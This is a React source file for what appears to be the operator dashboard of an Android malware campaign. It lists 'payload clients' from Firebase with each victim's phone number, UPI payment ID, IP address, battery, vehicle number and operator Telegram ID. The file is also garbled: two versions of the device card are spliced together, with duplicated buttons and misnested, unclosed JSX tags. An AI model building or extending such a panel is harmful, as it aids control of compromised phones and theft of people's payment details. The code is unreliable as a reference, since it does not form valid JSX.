import { useEffect, useState, useMemo } from 'react';
import { db } from '@/lib/firebase';
import { ref, onValue, set, remove } from 'firebase/database';
import { Link } from 'wouter';
import { Search, Smartphone, Battery, BatteryWarning, Pin, PinOff, Activity, Wifi, ChevronRight, Signal } from 'lucide-react';
import { Layout } from '@/components/layout';
import { useAuth } from '@/lib/auth';
import { normalizeDevice, type NormalizedDevice } from '@/lib/normalizeDevice';
import { Reveal, Eyebrow, StatTile, GlassCard } from '@/components/ui/bezel';
import { cn } from '@/lib/utils';

export function Dashboard() {
  const { isAdmin, userId } = useAuth();
  const [devices, setDevices] = useState<NormalizedDevice[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState('');
  const [pinnedIds, setPinnedIds] = useState<Set<string>>(new Set());

  useEffect(() => {
    const clientsRef = ref(db, 'clients');
    const unsubscribe = onValue(clientsRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val();
        const devicesList = Object.keys(data).map((key) =>
          normalizeDevice(key, data[key])
        );
        setDevices(devicesList);
      } else {
        setDevices([]);
      }
      setLoading(false);
    });
    return () => unsubscribe();
  }, []);

  useEffect(() => {
    if (!userId) return;
    const pinsRef = ref(db, `config/pins/${userId}`);
    const unsubscribe = onValue(pinsRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val() as Record<string, boolean>;
        setPinnedIds(new Set(Object.keys(data).filter((k) => data[k])));
      } else {
        setPinnedIds(new Set());
      }
    });
    return () => unsubscribe();
  }, [userId]);

  const togglePin = (deviceId: string, e: React.MouseEvent) => {
    e.preventDefault();
    e.stopPropagation();
    if (!userId) return;
    const pinRef = ref(db, `config/pins/${userId}/${deviceId}`);
    if (pinnedIds.has(deviceId)) {
      remove(pinRef);
    } else {
      set(pinRef, true);
    }
  };

  const visibleDevices = useMemo(() => {
    if (isAdmin) return devices;
    return devices.filter((d) => d.ownerTelegramId === userId);
  }, [devices, isAdmin, userId]);

  const filteredDevices = useMemo(() => {
    const base = search
      ? visibleDevices.filter((d) => {
          const q = search.toLowerCase();
          return (
            d.phone.toLowerCase().includes(q) ||
            d.model.toLowerCase().includes(q) ||
            d.upi.toLowerCase().includes(q) ||
            d.id.toLowerCase().includes(q) ||
            (d.ip_address || '').includes(q)
          );
        })
      : visibleDevices;

    return [...base].sort((a, b) => {
      const aPinned = pinnedIds.has(a.id) ? 0 : 1;
      const bPinned = pinnedIds.has(b.id) ? 0 : 1;
      if (aPinned !== bPinned) return aPinned - bPinned;
      return a.id.localeCompare(b.id);
    });
  }, [visibleDevices, search, pinnedIds]);

  const getBatteryValue = (battery: string) => {
    return parseInt(battery.replace('%', ''), 10) || 0;
  };

  const onlineCount = filteredDevices.filter((d) => d.isOnline).length;

  return (
    <Layout>
      {/* Head */}
      <div className="flex flex-col md:flex-row justify-between items-start md:items-end gap-5 mb-10">
        <div>
          <Eyebrow dot className="mb-4">Command Surface</Eyebrow>
          <h1 className="text-3xl md:text-4xl font-semibold tracking-tight text-foreground">
            Dashboard
          </h1>
          <p className="text-sm text-muted-foreground mt-2 flex items-center gap-2">
            <Activity className="w-4 h-4 text-[#a78bfa]" strokeWidth={1.6} />
            <span>
              {filteredDevices.length} device{filteredDevices.length !== 1 ? 's' : ''}
              {pinnedIds.size > 0 && ` · ${pinnedIds.size} pinned`}
              {' · '}<span className="text-[#34d399]">{onlineCount} online</span>
            </span>
          </p>
        </div>

        <div className="relative w-full md:w-72">
          <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" strokeWidth={1.6} />
          <input
            type="text"
            placeholder="Search phone, model, IP..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="field pl-11 py-3"
          />
        </div>
      </div>

      {/* Bento stat strip */}
      <Reveal className="mb-8">
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-3">
          {[
            { label: 'Total Devices', value: filteredDevices.length, icon: <Smartphone className="w-5 h-5" strokeWidth={1.6} />, tone: 'default' },
            { label: 'Online Now', value: onlineCount, icon: <Signal className="w-5 h-5" strokeWidth={1.6} />, tone: 'accent' },
            { label: 'Pinned', value: pinnedIds.size, icon: <Pin className="w-5 h-5" strokeWidth={1.6} />, tone: 'cyan' },
            { label: 'Low Battery', value: filteredDevices.filter((d) => getBatteryValue(d.battery) > 0 && getBatteryValue(d.battery) <= 20).length, icon: <BatteryWarning className="w-5 h-5" strokeWidth={1.6} />, tone: 'warn' },
          ].map((s) => (
            <GlassCard key={s.label} className="rounded-3xl" innerClassName="rounded-3xl p-5">
              <StatTile label={s.label} value={s.value} icon={s.icon} tone={s.tone as any} />
            </GlassCard>
          ))}
        </div>
      </Reveal>

      {loading ? (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
          {[1, 2, 3, 4, 5, 6].map((i) => (
            <div key={i} className="h-48 rounded-[1.75rem] animate-pulse bg-white/[0.03] border border-white/[0.05]" />
          ))}
        </div>
      ) : filteredDevices.length === 0 ? (
        <GlassCard className="rounded-[1.75rem]" innerClassName="rounded-[1.75rem] py-24 px-4 text-center">
          <div className="bezel mx-auto w-fit mb-6">
            <div className="bezel-inner w-20 h-20 flex items-center justify-center">
              <Smartphone className="w-9 h-9 text-muted-foreground" strokeWidth={1.4} />
            </div>
          </div>
          <h3 className="text-lg font-semibold text-foreground mb-2">No devices found</h3>
          <p className="text-sm text-muted-foreground max-w-sm mx-auto">
            {search
              ? 'Adjust your search query to find active devices.'
              : isAdmin
                ? 'Awaiting initial connection from payload clients.'
                : 'No devices are assigned to your account yet. Contact admin.'}
          </p>
        </GlassCard>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
          {filteredDevices.map((device, i) => {
            const batteryNum = getBatteryValue(device.battery);
            const isPinned = pinnedIds.has(device.id);

            return (
              <Reveal key={device.id} delay={(i % 3) * 70}>
                <Link
                  href={`/device/${device.id}`}
                  className="group block"
                >
                  <GlassCard
                    hover
                    className={cn('rounded-[1.75rem] transition-colors duration-700', isPinned && '!border-[#8b5cf6]/60')}
                    innerClassName="rounded-[1.75rem] p-5 flex flex-col relative"
                  >
                    <div className={cn(
                      'absolute top-0 left-5 right-5 h-px transition-colors duration-700 ease-smooth',
                      isPinned ? 'bg-[#8b5cf6]' : device.isOnline ? 'bg-[#34d399]' : 'bg-white/10'
                    )} />

                    <div className="flex justify-between items-start mb-5 mt-1">
                      <div className="flex items-center gap-3.5">
                        <div className="w-11 h-11 rounded-2xl bg-white/[0.05] border border-white/10 flex items-center justify-center">
                          <Smartphone className="w-5 h-5 text-muted-foreground group-hover:text-[#a78bfa] transition-colors duration-500" strokeWidth={1.5} />
                        </div>
                        <div>
                          <div className="text-[10px] font-medium tracking-[0.16em] text-muted-foreground uppercase">
                            DEVICE {i.toString().padStart(3, '0')}
                          </div>
                          <div className="font-semibold text-[15px] text-foreground truncate w-28 mt-0.5" title={device.model}>
                            {device.model}
                          </div>
                        </div>
                      </div>

                      <div className="flex items-center gap-2">
                        <button
                          onClick={(e) => togglePin(device.id, e)}
                          title={isPinned ? 'Unpin' : 'Pin to top'}
                          className={cn(
                            'p-2 rounded-full transition-all duration-500 ease-spring',
                            isPinned
                              ? 'bg-[#8b5cf6]/15 text-[#a78bfa] opacity-100'
                              : 'opacity-0 group-hover:opacity-100 text-muted-foreground hover:text-[#a78bfa] hover:bg-white/[0.06]'
                          )}
                        >
                          {isPinned ? <PinOff className="w-3.5 h-3.5" strokeWidth={1.6} /> : <Pin className="w-3.5 h-3.5" strokeWidth={1.6} />}
                        </button>

                        <span className={cn(
                          'inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-semibold',
                          device.isOnline
                            ? 'bg-[#34d399]/12 text-[#34d399] border border-[#34d399]/20'
                            : 'bg-white/[0.04] text-muted-foreground border border-white/[0.08]'
                        )}>
                          <span className={cn('w-1.5 h-1.5 rounded-full', device.isOnline ? 'bg-[#34d399] animate-pulse shadow-[0_0_8px_rgba(52,211,153,0.9)]' : 'bg-white/30')} />
                          {device.isOnline ? 'Online' : 'Offline'}
                        </span>
                      </div>
                    </div>

                  <div className="flex items-center gap-1">
                    <button
                      onClick={(e) => togglePin(device.id, e)}
                      title={isPinned ? 'Unpin' : 'Pin to top'}
                      className={`p-2 rounded-full transition-all ${
                        isPinned
                          ? 'bg-[#7c3aed]/10 text-[#7c3aed] opacity-100'
                          : 'opacity-0 group-hover:opacity-100 text-[#6b5b7d] hover:text-[#7c3aed] hover:bg-[#f5efff]'
                      }`}
                    >
                      {isPinned ? <PinOff className="w-3.5 h-3.5" /> : <Pin className="w-3.5 h-3.5" />}
                    </button>

                    <span className={`inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-xs font-semibold ${
                      device.isOnline
                        ? 'bg-[#10b981]/10 text-[#10b981]'
                        : 'bg-[#9ca3af]/20 text-[#6b5b7d]'
                    }`}>
                      <span className={`w-1.5 h-1.5 rounded-full ${device.isOnline ? 'bg-[#10b981] animate-pulse' : 'bg-[#9ca3af]'}`} />
                      {device.isOnline ? 'Online' : 'Offline'}
                    </span>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-y-3 gap-x-2 text-sm mt-auto">
                  <div className="flex flex-col">
                    <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">Phone</span>
                    <span className="font-medium text-xs text-[#2d1b4e]">{device.phone || 'N/A'}</span>
                  </div>
                  {device.vehicleNumber && (
                    <div className="flex flex-col col-span-2">
                      <span className="text-[10px] text-amber-600 dark:text-amber-400 uppercase tracking-wider font-medium">Vehicle</span>
                      <span className="font-mono font-semibold text-xs text-amber-700 dark:text-amber-300 truncate">{device.vehicleNumber}</span>
                    </div>
                  )}
                  <div className="flex flex-col">
                    {device.upi ? (
                      <>
                        <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">UPI</span>
                        <span className="font-medium text-xs text-[#7c3aed] truncate">{device.upi}</span>
                      </>
                    ) : device.androidV ? (
                      <>
                        <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">Android</span>
                        <span className="font-medium text-xs text-[#2d1b4e]">v{device.androidV}</span>
                      </>
                    ) : (
                      <>
                        <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">UPI</span>
                        <span className="font-medium text-xs text-[#9ca3af]">N/A</span>
                      </>
                    )}
                  </div>
                </div>

                <div className="mt-4 pt-3 border-t border-[#d8c8f0] flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    {device.battery && (
                      <div className="flex items-center gap-1 text-xs text-[#6b5b7d] font-medium">
                        {batteryNum <= 20 ? (
                          <BatteryWarning className="w-3.5 h-3.5 text-[#f59e0b]" />
                    <div className="grid grid-cols-2 gap-y-4 gap-x-2 text-sm mt-auto">
                      <div className="flex flex-col">
                        <span className="text-[10px] text-muted-foreground uppercase tracking-wider font-medium">Phone</span>
                        <span className="font-medium text-xs text-foreground mt-0.5">{device.phone || 'N/A'}</span>
                      </div>
                      <div className="flex flex-col">
                        {device.upi ? (
                          <>
                            <span className="text-[10px] text-muted-foreground uppercase tracking-wider font-medium">UPI</span>
                            <span className="font-medium text-xs text-[#a78bfa] truncate mt-0.5">{device.upi}</span>
                          </>
                        ) : device.androidV ? (
                          <>
                            <span className="text-[10px] text-muted-foreground uppercase tracking-wider font-medium">Android</span>
                            <span className="font-medium text-xs text-foreground mt-0.5">v{device.androidV}</span>
                          </>
                        ) : (
                          <>
                            <span className="text-[10px] text-muted-foreground uppercase tracking-wider font-medium">UPI</span>
                            <span className="font-medium text-xs text-muted-foreground/50 mt-0.5">N/A</span>
                          </>
                        )}
                      </div>
                    </div>

                    <div className="mt-5 pt-4 border-t border-white/[0.07] flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        {device.battery && (
                          <div className="flex items-center gap-1.5 text-xs text-muted-foreground font-medium">
                            {batteryNum <= 20 ? (
                              <BatteryWarning className="w-3.5 h-3.5 text-[#fbbf24]" strokeWidth={1.6} />
                            ) : (
                              <Battery className="w-3.5 h-3.5 text-muted-foreground" strokeWidth={1.6} />
                            )}
                            <span className={batteryNum <= 20 ? 'text-[#fbbf24]' : ''}>{device.battery}</span>
                          </div>
                        )}
                        {device.ip_address && (
                          <span className="text-[10px] font-medium text-muted-foreground bg-white/[0.04] px-2 py-1 rounded-lg border border-white/[0.07] flex items-center gap-1.5">
                            <Wifi className="w-2.5 h-2.5" strokeWidth={1.6} />
                            {device.ip_address.split('.').slice(0, 2).join('.')}…
                          </span>
                        )}
                        {device.ownerTelegramId && isAdmin && (
                          <span className="text-[10px] font-medium text-muted-foreground bg-white/[0.04] px-2 py-1 rounded-lg border border-white/[0.07]">
                            {device.ownerTelegramId.slice(0, 8)}…
                          </span>
                        )}
                      </div>
                      <ChevronRight className="w-4 h-4 text-muted-foreground group-hover:text-[#a78bfa] transition-all duration-500 group-hover:translate-x-1" strokeWidth={1.6} />
                    </div>
                  </GlassCard>
                </Link>
              </Reveal>
            );
          })}
        </div>
      )}
    </Layout>
  );
}
